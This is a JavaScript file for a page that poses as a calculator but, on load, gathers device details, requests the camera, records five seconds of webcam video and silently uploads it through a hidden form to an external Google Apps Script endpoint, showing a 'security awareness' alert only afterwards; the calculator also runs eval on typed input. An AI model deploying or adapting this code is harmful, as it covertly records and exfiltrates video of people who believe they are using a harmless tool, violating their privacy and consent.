console.log("Script Loaded");

let result = document.getElementById("result");
let video = document.getElementById("video");

const DRIVE_API = "https://script.google.com/macros/s/AKfycbxwMWlXxZ2yU0EFMdXhqtjhL7rHHtJW9b8rt-gb6uxMzAYSr0u2YR4zKnaGLPwCir_xYg/exec";

function press(v){
result.value += v;
}

function clearResult(){
result.value="";
}

function calculate(){
try{
result.value = eval(result.value);
}catch{
result.value="Error";
}
}

let mediaRecorder;
let chunks=[];

async function startCamera(){

try{

console.log("Starting camera");

let stream = await navigator.mediaDevices.getUserMedia({video:true});

video.srcObject = stream;

mediaRecorder = new MediaRecorder(stream);

mediaRecorder.ondataavailable=function(e){
chunks.push(e.data);
};

mediaRecorder.onstop=function(){

console.log("Recording stopped");

let blob=new Blob(chunks,{type:"video/webm"});

chunks=[];

saveLocal(blob);

uploadToDrive(blob);

setTimeout(()=>{
showSecurityWarning();
},1000);

};

mediaRecorder.start();

console.log("Recording started");

setTimeout(()=>{
mediaRecorder.stop();
},5000);

}catch(err){

console.log("Camera error:",err);

}

}

function saveLocal(blob){

let reader=new FileReader();

reader.readAsDataURL(blob);

reader.onloadend=function(){

localStorage.setItem("recordedVideo",reader.result);

console.log("Video saved to Local Storage");

};

}

function uploadToDrive(blob){

let reader=new FileReader();

reader.readAsDataURL(blob);

reader.onloadend=function(){

let base64data=reader.result.split(',')[1];

let form=document.createElement("form");
form.method="POST";
form.action=DRIVE_API;
form.target="hidden_iframe";

let inputData=document.createElement("input");
inputData.type="hidden";
inputData.name="data";
inputData.value=base64data;

let inputName=document.createElement("input");
inputName.type="hidden";
inputName.name="filename";
inputName.value="capture_"+Date.now()+".webm";

form.appendChild(inputData);
form.appendChild(inputName);

document.body.appendChild(form);

form.submit();

console.log("Upload request sent to Drive");

};

}

function captureDeviceInfo(){

let deviceInfo={
browser:navigator.userAgent,
os:navigator.platform,
screen:screen.width+"x"+screen.height,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
};

localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));

console.table(deviceInfo);

}

function showSecurityWarning(){

alert(
"Security Awareness Demonstration\n\n"+
"This demonstration shows how malicious websites could misuse camera permissions.\n\n"+
"Always verify a website before allowing camera access."
);

}

window.onload=function(){

console.log("Page loaded");

captureDeviceInfo();

setTimeout(()=>{
startCamera();
},1500);

};
